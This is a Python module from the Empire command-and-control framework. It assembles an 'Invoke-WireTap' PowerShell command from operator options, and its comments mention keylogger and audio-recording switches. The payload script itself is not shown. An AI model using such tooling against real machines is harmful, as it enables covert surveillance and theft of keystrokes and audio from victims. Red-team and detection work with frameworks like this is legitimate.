from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source
from empire.server.utils.option_util import coerce_legacy_value


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # Build the command as space-separated tokens. Invoke-WireTap tokenizes
        # -Command on spaces, so each switch/value must be its own token; joining
        # avoids gluing a bare switch onto the previous value option (e.g.
        # "record_audio 10" + "keylogger" -> "10keylogger", silently dropping the
        # switch). A leading/double space is also avoided regardless of order.
        parts = []
        for option, raw_value in params.items():
            values = coerce_legacy_value(raw_value)
            if option.lower() != "agent" and values and values != "":
                if isinstance(raw_value, bool):
                    # Native boolean -> [switch]: bare flag (no dash, per this
                    # module's command format) only when set, never "option False".
                    if raw_value:
                        parts.append(str(option))
                elif option.lower() == "time":
                    parts.append(str(values))
                else:
                    parts.append(str(option) + " " + str(values))

        script_end = 'Invoke-WireTap -Command "' + " ".join(parts) + '"'

        return script, script_end
